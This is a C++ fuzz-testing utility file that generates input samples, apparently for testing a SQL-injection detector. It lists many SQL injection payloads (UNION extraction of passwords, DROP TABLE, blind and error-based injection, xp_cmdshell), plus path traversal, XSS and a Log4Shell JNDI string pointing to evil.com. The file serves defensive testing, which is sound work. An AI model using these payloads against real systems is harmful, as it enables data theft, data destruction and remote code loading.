/*
 * Copyright (c) Huawei Technologies Co., Ltd. 2026-2026. All rights reserved.
 *
 * @file fuzz_utils.cpp
 * @brief FUZZ测试工具函数实现
 */

#include "fuzz_utils.h"
#include <random>
#include <algorithm>
#include <sstream>
#include <iomanip>

namespace {
/* [FIX REPORT-2026-0000017] SQL 片段复杂度上限：complexity 源自 fuzz 字节，
 * 不设上限时 clauses = complexity + 1 可整型溢出，或构造出超长字符串耗尽内存 */
constexpr int kMaxSqlFragmentComplexity = 64;
}  // namespace

/* ========== 测试样本生成器 ========== */

/**
 * @brief 生成SQL注入测试用例
 */
std::vector<std::string> GenerateSQLiSamples() {
    static const std::vector<std::string> sqli_samples = {
        // 经典OR注入
        "id=1' OR '1'='1",
        "admin' OR 1=1--",
        "1' OR 1=1--",
        "' OR '1'='1'--",
        "\" OR \"1\"=\"1\"--",

        // 注释绕过
        "admin'--",
        "id=1' OR '1'='1#",
        "admin'/*comment*/",
        "id=1'/*comment*/OR/*comment*/'1'='1",

        // UNION注入
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "admin' UNION SELECT 1,version(),3--",

        // 堆叠查询
        "id=1; DROP TABLE users--",
        "id=1'; DELETE FROM users--",
        "1'; INSERT INTO users VALUES ('hacker','password')--",
        "id=1'; UPDATE users SET password='hacked'--",

        // 时间盲注
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
        "1' OR BENCHMARK(50000000,MD5(1))--",

        // 布尔盲注
        "1' AND 1=1--",
        "1' AND 1=2--",
        "admin' AND LENGTH(password)=5--",

        // 错误注入
        "1' AND extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)))--",
        "1' AND updatexml(1, concat(0x5c, (select user())), 1)--",

        // 二次注入
        "admin' INSERT INTO users VALUES ('hacker','pass')--",

        // 编码绕过
        "%27%20OR%20%271%27%3D%271",
        "id=1%27%20OR%20%271%27%3D%271",

        // 大小写绕过
        "1' UnIoN SeLeCt NuLl--",
        "1' aNd 1=1--",

        // 特殊字符注入
        "1' OR 1=1#",
        "1\" OR \"1\"=\"1",
        "admin'/*",
        "'; exec xp_cmdshell('dir'); --",

        // HTTP参数污染
        "id=1&id=2' OR '1'='1",
        "search=a&search=b' OR '1'='1",

        // 组合攻击
        "admin' OR '1'='1' UNION SELECT NULL,NULL--",
        "1' AND 1=1 UNION SELECT NULL--",
    };

    return sqli_samples;
}

/**
 * @brief 生成正常输入测试用例
 */
std::vector<std::string> GenerateNormalSamples() {
    static const std::vector<std::string> normal_samples = {
        "id=123",
        "search=hello world",
        "user=john@example.com",
        "page=1&sort=date",
        "filter=active&status=enabled",
        "query=SELECT * FROM users WHERE id = 1",
        "name=John Doe",
        "age=25",
        "city=New York",
        "product=laptop",
        "category=electronics",
        "price=999.99",
        "description=A great product",
        "review=This is amazing!",
        "rating=5",
        "cmd=ls -la",
        "data={\"name\":\"test\",\"value\":123}",
        "token=abc123def456",
        "session_id=sess_987654321",
        "user_id=12345",
        "lang=en_US",
        "format=json",
        "limit=10",
        "offset=20",
        "order=desc",
        "field=name",
        "callback=processResponse",
        "debug=true",
        "cache=false",
        "version=1.0",
    };

    return normal_samples;
}

/**
 * @brief 生成边界情况测试用例
 */
std::vector<std::string> GenerateEdgeCaseSamples() {
    static const std::vector<std::string> edge_cases = {
        "",
        "a",
        "ab",
        "abc",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "!@#$%^&*()_+-={}[]|\\:\";'<>,.?/",
        "测试中文输入",
        "🔥🚀💻输入测试",
        "\x00\x01\x02\xff\xfe",
        "'OR''='",
        "''OR''='",
        "''OR 1=1--",
        "../../etc/passwd",
        "<script>alert(1)</script>",
        "${jndi:ldap://evil.com/a}",
        "1' OR (1,2)=(SELECT * FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,VERSION()) FROM information_schema.tables) AS x)",
        "NULL_INPUT_TEST",
        "\\n\\r\\t\\b\\f",
        "99999999999999999999999999999999999999",
        "%n%n%n%n%n",
        "../../../windows/system32/drivers/etc/hosts",
        "\\x00\\x01\\x02\\x03",
        "%00%01%02%03",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
        "1' OR ASCII(SUBSTRING((SELECT user()),1,1))>64--",
        "'; DROP TABLE users; SELECT * FROM users WHERE '1'='1",
    };

    return edge_cases;
}

/**
 * @brief 生成畸形输入测试用例
 */
std::vector<std::string> GenerateMalformedSamples() {
    static const std::vector<std::string> malformed_samples = {
        "\x00",
        "\x00\x00\x00\x00",
        "\xff\xff\xff\xff",
        "''''''''''''''''''",
        "\"\"\"\"\"\"\"\"\"\"\"",
        "\\\\\\\\\\\\\\",
        "))))))))))))",
        "((((((((((((",
        "{{{{{{{{{{{",
        "}}}}}}}}}}}",
        "[[[[[[[[[[[",
        "]]]]]]]]]]]",
        "???????????",
        "!!!!!!!!!!!",
        "@@@@@@@@@@@",
        "############",
        "$$$$$$$$$$$",
        "%%%%%%%%%%%",
        "^^^^^^^^^^^",
        "&&&&&&&&&&",
        "**********",
        "+++++++++++",
        "===========",
        "-----------",
        "___________",
        ":::::::::",
        ",,,,,,,,,,,",
        "...........",
        "|||||||||||",
    };

    return malformed_samples;
}

/* ========== 随机数据生成器 ========== */

/**
 * @brief 生成随机Unicode字符串
 */
std::string GenerateRandomUnicode(const uint8_t* data, size_t size, size_t length) {
    static const std::vector<std::string> unicode_chars = {
        "测试", "中文", "字符", "输入", "数据",
        "🔥", "🚀", "💻", "🎯", "🛡️",
        "α", "β", "γ", "δ", "ε",
        "А", "Б", "В", "Г", "Д",
        "検索", "テスト", "データ",
        "José", "François", "Müller",
        "例", "题", "文", "字"
    };

    std::string result;
    /* [FIX REPORT-2026-0000017] size==0 时 i % size 为除零（UB），data 为空时无字节可取 */
    if (data == nullptr || size == 0) {
        return result;
    }
    for (size_t i = 0; i < length; ++i) {
        result += unicode_chars[data[i % size] % unicode_chars.size()];
    }
    return result;
}

/**
 * @brief 生成随机SQL片段
 */
std::string GenerateRandomSQLFragment(const uint8_t* data, size_t size, int complexity) {
    static const std::vector<std::string> keywords = {
        "SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE",
        "UNION", "AND", "OR", "NOT", "IN", "LIKE", "BETWEEN"
    };

    static const std::vector<std::string> operators = {
        "=", "!=", "<>", ">", "<", ">=", "<=", "AND", "OR", "NOT"
    };

    static const std::vector<std::string> functions = {
        "COUNT()", "SUM()", "AVG()", "MAX()", "MIN()",
        "CONCAT()", "SUBSTRING()", "LENGTH()", "VERSION()", "USER()"
    };

    std::string result;
    /* [FIX REPORT-2026-0000017] size==0 时 i % size 为除零（UB）；
     * complexity 来自 fuzz 输入，钳制上限避免 clauses 溢出与超长字符串构造 */
    if (data == nullptr || size == 0) {
        return result;
    }
    if (complexity < 0) {
        complexity = 0;
    }
    if (complexity > kMaxSqlFragmentComplexity) {
        complexity = kMaxSqlFragmentComplexity;
    }
    int clauses = complexity + 1;

    for (int i = 0; i < clauses; ++i) {
        if (i > 0) result += " ";
        uint8_t b = data[i % size];
        result += keywords[b % keywords.size()];

        if (complexity > 2 && i % 2 == 0) {
            b = data[(i + 3) % size];
            result += " " + operators[b % operators.size()];
        }

        if (complexity > 3 && i % 3 == 0) {
            b = data[(i + 7) % size];
            result += " " + functions[b % functions.size()];
        }
    }

    return result;
}

/* ========== 输入验证函数 ========== */

/**
 * @brief 验证输入有效性
 */
bool IsValidInput(const uint8_t* data, size_t size) {
    if (!data || size == 0 || size > 8192) {
        return false;
    }
    return true;
}

/**
 * @brief 从数据构造有效的token序列
 */
std::vector<int> GenerateValidTokens(const uint8_t* data, size_t size, int max_token) {
    std::vector<int> tokens;
    tokens.reserve(size);

    for (size_t i = 0; i < size; ++i) {
        int token = data[i] % (max_token + 1);
        tokens.push_back(token);
    }

    return tokens;
}

/**
 * @brief 生成随机特征向量
 */
std::vector<int> GenerateRandomFeatures(int feature_dim, int min_value, int max_value) {
    std::vector<int> features(feature_dim);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(min_value, max_value);

    for (int i = 0; i < feature_dim; ++i) {
        features[i] = dis(gen);
    }

    return features;
}

/**
 * @brief 生成特殊字符序列
 */
std::string GenerateSpecialChars(bool include_null, size_t length) {
    static const std::string special_chars = "!@#$%^&*()_+-={}[]|\\:\";'<>,.?/~`\n\r\t\x0b\x0c";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> dis(0, special_chars.size() - 1);

    std::string result;
    result.reserve(length);

    for (size_t i = 0; i < length; ++i) {
        char c = special_chars[dis(gen)];
        if (c != '\x00' || include_null) {
            result += c;
        }
    }

    return result;
}

/**
 * @brief 从二进制数据创建安全字符串
 */
std::string CreateSafeString(const uint8_t* data, size_t size) {
    if (!data || size == 0) {
        return "";
    }

    // 非打印字节 → SQL 相关字符映射表（让每个字节值产生不同输出）
    static const char kCharMap[] = {
        '\'', '"', ';', '-', '#', '/', '*', '|',
        '&', '=', '>', '<', '(', ')', '[', ']',
        '{', '}', '%', '_', '^', '~', '`', '@',
        '!', '+', ',', '.', ':', '?', '\\', ' '
    };

    std::string result;
    result.reserve(size);

    for (size_t i = 0; i < size; ++i) {
        uint8_t byte = data[i];
        if (byte == 0x00) {
            result += ' ';
            continue;
        }
        if (byte >= 0x20 && byte <= 0x7E) {
            result += static_cast<char>(byte);
        } else if (byte == '\n' || byte == '\r' || byte == '\t') {
            result += static_cast<char>(byte);
        } else {
            result += kCharMap[byte & 0x1F];
        }
    }

    return result;
}

/**
 * @brief 生成连续字符串用于压力测试
 */
std::string GenerateRepeatedString(char character, size_t length) {
    return std::string(length, character);
}